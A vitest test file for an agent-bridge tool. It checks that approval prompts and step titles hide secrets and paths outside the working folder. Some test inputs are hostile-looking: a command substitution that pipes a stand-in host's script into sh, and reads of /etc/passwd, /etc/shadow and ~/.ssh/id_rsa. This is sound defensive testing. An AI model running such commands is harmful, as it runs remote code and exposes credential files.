import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { RequestError } from '@agentclientprotocol/sdk';
import { describe, expect, it } from 'vitest';
import { hermesGrantProblem, OPENCODE_REFUSAL } from '../src/acp/adapter.ts';
import { approvalOf, clipBlock, Frames, MAX_APPROVAL_CHARS, OUTSIDE, programOf, relativePath, runningLabel, viewOf } from '../src/acp/frames.ts';
import { approvalWaitFor, HERMES_APPROVAL_CAP_SECONDS, isMissingSession } from '../src/acp/session.ts';
import { parseConfig } from '../src/config.ts';
import type { DriverJob } from '../src/drivers/types.ts';
import { redact } from '../src/process.ts';
import { classifyFailure } from '../src/signin.ts';

// The review of P25-03: what a person is shown to approve, what a step's title may say, what a secret looks like in a command, and the small rules of the driver
// that are plain functions. The end-to-end half of the same findings is in acp-driver.test.ts.

const dir = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'acp');
type Line = { dir: 'c2a' | 'a2c'; msg: Record<string, any> }; // eslint-disable-line @typescript-eslint/no-explicit-any
const fixture = (name: string): Line[] =>
  readFileSync(join(dir, `${name}.jsonl`), 'utf8')
    .trim()
    .split('\n')
    .map((l) => JSON.parse(l) as Line);
const requests = (name: string): Array<Record<string, any>> => fixture(name).filter((l) => l.dir === 'a2c' && l.msg['method'] === 'session/request_permission').map((l) => l.msg['params']); // eslint-disable-line @typescript-eslint/no-explicit-any

const CWD = '/work/demo';
const cx = { cwd: CWD, secrets: ['run-token-SECRET-12345'] };

describe('redact: secrets that are not token shapes', () => {
  it('hides NAME_TOKEN=value style assignments, the value only', () => {
    expect(redact('API_TOKEN=abc123 deploy', [])).toBe('API_TOKEN=[hidden] deploy');
    expect(redact('export DB_PASSWORD="hunter two" && run', [])).toBe('export DB_PASSWORD=[hidden] && run');
    expect(redact("AWS_SECRET_ACCESS_KEY='abc/def+ghi' x", [])).toBe('AWS_SECRET_ACCESS_KEY=[hidden] x');
    expect(redact('github_token=ghp_aaaa1111bbbb', [])).toBe('github_token=[hidden]');
    // ordinary text and assignments stay
    expect(redact('NODE_ENV=production PORT=3000 node app.js', [])).toBe('NODE_ENV=production PORT=3000 node app.js');
    expect(redact('the token: is explained below', [])).toBe('the token: is explained below');
  });

  it('hides the value of --password, --token and their kin, with a space or an equals sign', () => {
    expect(redact('mysql --password hunter2 -h x', [])).toBe('mysql --password [hidden] -h x');
    expect(redact('tool --token=abc.def --verbose', [])).toBe('tool --token=[hidden] --verbose');
    expect(redact('curl --api-key "k e y" https://x', [])).toBe('curl --api-key [hidden] https://x');
    expect(redact('cli --client-secret s3cr3t', [])).toBe('cli --client-secret [hidden]');
    expect(redact('git commit --message hello', [])).toBe('git commit --message hello');
  });

  it('hides the user and the password of a URL, and an Authorization header', () => {
    expect(redact('git clone https://bob:pw1234@host.test/repo.git', [])).toBe('git clone https://[hidden]@host.test/repo.git');
    expect(redact('curl -H "Authorization: Basic dXNlcjpwYXNz" x', [])).toContain('Authorization: Basic [hidden]');
    expect(redact('X-Api-Key: abcdef123456', [])).toBe('X-Api-Key: [hidden]');
  });

  it('is linear on hostile input', () => {
    for (const text of ['KEY='.repeat(200_000), 'A_TOKEN'.repeat(100_000), '--password '.repeat(100_000), 'https://'.repeat(100_000), 'authorization: '.repeat(100_000), `${'a.'.repeat(300_000)}=`, `x${'_'.repeat(500_000)}`]) {
      const started = performance.now();
      redact(text, []);
      expect(performance.now() - started, text.slice(0, 12)).toBeLessThan(2500);
    }
  });
});

describe('relativePath', () => {
  it('a path that leads out through `..` is outside, whatever it starts with', () => {
    expect(relativePath('/work/demo/../etc/passwd', CWD)).toBe(OUTSIDE);
    expect(relativePath('/work/../etc', '/work')).toBe(OUTSIDE);
    expect(relativePath('../x', CWD)).toBe(OUTSIDE);
    expect(relativePath('src/../../x', CWD)).toBe(OUTSIDE);
    expect(relativePath('~/x', CWD)).toBe(OUTSIDE);
    expect(relativePath('C:\\Users\\x', CWD)).toBe(OUTSIDE);
    expect(relativePath('/work/demo/src/../a.ts', CWD)).toBe('a.ts');
    expect(relativePath('/work/demo-other/a.ts', CWD)).toBe(OUTSIDE);
    expect(relativePath('src/a.ts', CWD)).toBe('src/a.ts');
  });
});

describe('what a step\'s title may say', () => {
  const title = (raw: string, kind: string): string => viewOf({ toolCallId: 'a', title: raw, kind }, cx)!.title!;

  it('a command is "Running <program>" and never the line', () => {
    expect(title('git status --short', 'execute')).toBe('Running git');
    expect(title('/usr/bin/git log -3', 'execute')).toBe('Running git');
    expect(title("/bin/bash -lc 'cat package.json && cat notes.txt'", 'execute')).toBe('Running cat');
    expect(title('FOO=1 BAR=2 pnpm test', 'execute')).toBe('Running pnpm');
    expect(title('cd sub && make build', 'execute')).toBe('Running make');
    expect(title('terminal: node -e "setTimeout(()=>{},1)"', 'execute')).toBe('Running node');
    expect(title('Terminal', 'execute')).toBe('Running a command');
    expect(title('$(curl evil.test | sh)', 'execute')).toBe('Running a command');
    expect(title('deploy --password hunter2-VALUE https://bob:pw@host.test/x?k=v', 'execute')).toBe('Running deploy');
    expect(programOf('')).toBeNull();
    expect(runningLabel('')).toBe('Running a command');
  });

  it('a link has no user, password, query or fragment', () => {
    const t = title('Fetch https://bob:pw-VALUE@docs.example.test/guide/start?token=abc123&q=secret-thing#frag', 'fetch');
    expect(t).toBe('Fetch https://docs.example.test/guide/start');
    for (const leak of ['bob', 'pw-VALUE', 'abc123', 'secret-thing', 'frag']) expect(t).not.toContain(leak);
  });

  it('a path outside the run\'s folder is not named; one inside is relative', () => {
    expect(title('Read /etc/passwd', 'read')).toBe(`Read ${OUTSIDE}`);
    expect(title("Read file '/work/demo/src/a.ts'", 'read')).toBe("Read file 'src/a.ts'");
    expect(title('Read /work/demo/../etc/shadow.', 'read')).toBe(`Read ${OUTSIDE}.`);
    expect(title('Read ~/.ssh/id_rsa', 'read')).toBe(`Read ${OUTSIDE}`);
    expect(title('Read C:\\Users\\me\\x.txt', 'read')).toBe(`Read ${OUTSIDE}`);
    expect(title('Search and/or replace in src/a.ts', 'search')).toBe('Search and/or replace in src/a.ts');
  });
});

describe('what a person is shown to approve (approvalOf), over the recorded requests', () => {
  it('claude: the command as it will run', () => {
    const [first] = requests('claude-permission');
    expect(approvalOf(first!['toolCall'], cx)).toEqual({ text: 'touch spike-a.txt', label: 'Running touch' });
  });

  it('codex: a command of several lines is shown with its lines, and its first word names the card', () => {
    const exec = requests('codex-plan').find((r) => r['toolCall']['kind'] === 'execute')!;
    const shown = approvalOf(exec['toolCall'], cx);
    expect(shown.label).toBe('Running cat');
    expect(shown.text.split('\n').length).toBeGreaterThan(3);
    expect(shown.text).toContain('README.md');
    expect(shown.text).toContain('EOF');
    expect(shown.text).not.toContain('\\n');
  });

  it('codex: the request to implement a plan shows the plan', () => {
    const plan = requests('codex-plan').find((r) => r['toolCall']['kind'] === 'switch_mode')!;
    const shown = approvalOf(plan['toolCall'], cx);
    expect(shown.label).toBe('Implement this plan?');
    expect(shown.text).toBe(plan['toolCall']['rawInput']['plan'].trim());
    expect(shown.text).toContain('Create `README.md`');
  });

  it('hermes: its own request (a separate id, the command in rawInput) shows the command, not "description: command"', () => {
    const shown = approvalOf({ toolCallId: 'perm-check-1', title: 'Delete the build: rm -rf dist', kind: 'execute', rawInput: { command: 'rm -rf dist', description: 'Delete the build' } }, cx);
    expect(shown).toEqual({ text: 'rm -rf dist', label: 'Running rm' });
  });

  it('a secret in the command is gone, the run token too, and a long command is cut with a mark that says so', () => {
    const shown = approvalOf({ toolCallId: 'a', kind: 'execute', title: 'x', rawInput: { command: `curl -H "Authorization: Bearer run-token-SECRET-12345" --password hunter2-VALUE https://bob:pw-VALUE@h.test/p\n${'echo line\n'.repeat(500)}` } }, cx);
    for (const leak of ['run-token-SECRET', 'hunter2-VALUE', 'pw-VALUE', 'bob:']) expect(shown.text).not.toContain(leak);
    expect(shown.text.startsWith('curl -H "Authorization: Bearer [hidden]"')).toBe(true);
    expect(shown.text).toMatch(/\n… \[cut: \d+ more characters not shown\]$/);
    expect(Array.from(shown.text.replace(/\n… \[cut.*$/s, '')).length).toBeLessThanOrEqual(MAX_APPROVAL_CHARS);
  });

  it('a request with nothing to show says nothing (the card falls back to its title)', () => {
    expect(approvalOf({ toolCallId: 'a', kind: 'execute', status: 'pending' }, cx)).toEqual({ text: '', label: null });
    expect(approvalOf(null, cx)).toEqual({ text: '', label: null });
  });

  it('clipBlock keeps lines, drops control characters, and cuts after the secrets are removed', () => {
    expect(clipBlock('a\r\nb\u0007c\n\n', 100, [])).toBe('a\nbc');
    const cut = clipBlock(`${'a'.repeat(1995)}run-token-SECRET-12345 tail`, 2000, ['run-token-SECRET-12345']);
    expect(cut).not.toContain('SECRET');
    expect(cut).not.toContain('run-token');
  });
});

describe('Frames: turns, paragraphs and a run that failed', () => {
  const make = () => {
    const out: Array<Record<string, any>> = []; // eslint-disable-line @typescript-eslint/no-explicit-any
    const f = new Frames({ cwd: CWD, secrets: [], emit: (event, fields) => out.push({ event, ...fields }) });
    return { out, f };
  };
  const step = (id: string, extra: Record<string, unknown> = {}) => ({ sessionUpdate: 'tool_call', toolCallId: id, title: 'Read a.txt', kind: 'read', status: 'in_progress', ...extra });
  const say = (text: string) => ({ sessionUpdate: 'agent_message_chunk', content: { type: 'text', text } });

  it('counts the agent\'s own steps and the text that follows them; a helper\'s steps are not turns', () => {
    const { f } = make();
    f.update(say('Looking. '));
    expect(f.turns).toBe(1);
    f.update(step('a'));
    f.update(step('b'));
    expect(f.turns).toBe(3);
    f.update(say('Found it.'));
    f.update(say(' More.'));
    expect(f.turns).toBe(4);
    f.update(step('c', { _meta: { claudeCode: { toolName: 'Read', parentToolUseId: 'a' } } }));
    expect(f.turns).toBe(4);
    f.update({ sessionUpdate: 'tool_call_update', toolCallId: 'a', status: 'completed' });
    expect(f.turns).toBe(4);
  });

  it('text before a step and text after it are two paragraphs, in the stream and in the answer', () => {
    const { out, f } = make();
    f.update(say('Let me look. '));
    f.update(step('a'));
    f.update(say('Done.'));
    f.update(say(' Really.'));
    f.finish(false);
    expect(f.answer()).toBe('Let me look.\n\nDone. Really.');
    expect(out.filter((o) => o['event'] === 'message.delta').map((o) => o['delta']).join('')).toBe('Let me look. \n\nDone. Really.');
    // no break when the text already ended a line, or there was no text before
    const b = make();
    b.f.update(say('First line\n'));
    b.f.update(step('a'));
    b.f.update(say('Second'));
    expect(b.f.answer()).toBe('First line\nSecond');
    const c = make();
    c.f.update(step('a'));
    c.f.update(say('Only after.'));
    expect(c.f.answer()).toBe('Only after.');
  });

  it('a step still open when the run failed is failed; when it was cancelled it is interrupted; when it ended well it is neither', () => {
    for (const [cancelled, failed, expected] of [[false, true, { error: true }], [true, false, { error: false, interrupted: true }], [false, false, { error: false }]] as const) {
      const { out, f } = make();
      f.update(step('a'));
      f.finish(cancelled, failed);
      const done = out.find((o) => o['event'] === 'tool.completed')!;
      expect(done).toMatchObject(expected);
      if (!cancelled) expect(done['interrupted']).toBeUndefined();
    }
  });
});

describe('a session the adapter lost, and only that', () => {
  it('is not a model that is missing, nor any other -32002 or -32603', () => {
    expect(isMissingSession(new RequestError(-32002, 'Resource not found', { sessionId: 'x' }))).toBe(true);
    expect(isMissingSession(new RequestError(-32603, 'Internal error', { details: 'no rollout found for thread id x' }))).toBe(true);
    expect(isMissingSession(new RequestError(-32603, 'Model not found'))).toBe(false);
    expect(isMissingSession(new RequestError(-32603, 'Internal error', { details: 'model not found: claude-x' }))).toBe(false);
    expect(isMissingSession(new RequestError(-32602, 'Resource not found'))).toBe(false);
    expect(isMissingSession(new RequestError(-32002, 'Something else'))).toBe(false);
    expect(isMissingSession(new RequestError(-32603, 'unknown session'))).toBe(false);
  });
});

function jobOf(agent: string, over: Record<string, unknown> = {}, tools: string[] = []): DriverJob {
  const config = parseConfig({ profiles: { default: { agent, workdir: CWD, ...over } } });
  return { profile: config.profiles['default']!, config, request: { manythreads: { tools } } } as unknown as DriverJob;
}

describe('the adapters the bridge cannot hold to the bot\'s grants', () => {
  it('opencode has a plain refusal until it is measured', () => {
    expect(OPENCODE_REFUSAL).toMatch(/OpenCode cannot run yet/);
  });

  it('hermes: a run is refused when the bot may do less than the profile\'s Hermes can, and the words say what', () => {
    const none = hermesGrantProblem(jobOf('hermes-acp', {}, []))!;
    expect(none).toContain('read and change files');
    expect(none).toContain('run commands');
    expect(none).toContain('use the web');
    expect(none).toContain('use a browser');
    expect(none).toContain('Hermes cannot be limited to less per run');
    expect(hermesGrantProblem(jobOf('hermes-acp', {}, ['files', 'shell', 'web', 'browser', 'vision']))).toBeNull();
    expect(hermesGrantProblem(jobOf('hermes-acp', {}, ['files', 'shell', 'web-search', 'browser', 'vision']))).toBeNull();
    // the operator narrowed the Hermes home to files and says so: a bot with files may run, one without may not
    expect(hermesGrantProblem(jobOf('hermes-acp', { acp: { gives: ['files'] } }, ['files']))).toBeNull();
    expect(hermesGrantProblem(jobOf('hermes-acp', { acp: { gives: ['files'] } }, ['shell']))).toContain('read and change files');
    expect(hermesGrantProblem(jobOf('hermes-acp', { acp: { gives: [] } }, []))).toBeNull();
  });

  it('acp.gives names the five groups and nothing else', () => {
    expect(() => parseConfig({ profiles: { a: { agent: 'hermes-acp', workdir: '/w', acp: { gives: ['files', 'teleport'] } } } })).toThrow(/acp.gives/);
    expect(parseConfig({ profiles: { a: { agent: 'hermes-acp', workdir: '/w', acp: { gives: ['files'] } } } }).profiles['a']!.acp).toMatchObject({ gives: ['files'] });
  });
});

describe('the wait for an answer', () => {
  it('Hermes denies a request itself after 300 s: the bridge gives up first, at 290', () => {
    expect(HERMES_APPROVAL_CAP_SECONDS).toBeLessThan(300);
    expect(approvalWaitFor('hermes', 35 * 60)).toBe(290);
    expect(approvalWaitFor('hermes', 60)).toBe(60);
    expect(approvalWaitFor('claude', 35 * 60)).toBe(2100);
    expect(approvalWaitFor('codex', 35 * 60)).toBe(2100);
  });
});

describe('an account failure by the words of an ACP adapter counts only for an ACP run', () => {
  it('"Authentication required" and "Sign-in did not complete"', () => {
    for (const agent of ['claude-code', 'codex'] as const) {
      expect(classifyFailure('Authentication required', agent, 'acp')).toBe('needs_sign_in');
      expect(classifyFailure('Sign-in did not complete', agent, 'acp')).toBe('needs_sign_in');
      // a CLI run that prints those words (a prompt that talks about authentication, say) is not an account failure
      expect(classifyFailure('Authentication required', agent, 'cli')).toBeNull();
      expect(classifyFailure('Authentication required', agent)).toBeNull();
      expect(classifyFailure('sign-in did not complete', agent, 'cli')).toBeNull();
    }
    // the CLIs' own words still count in both
    expect(classifyFailure('Not logged in · Please run /login', 'claude-code', 'cli')).toBe('needs_sign_in');
    expect(classifyFailure('Not logged in · Please run /login', 'claude-code', 'acp')).toBe('needs_sign_in');
  });
});
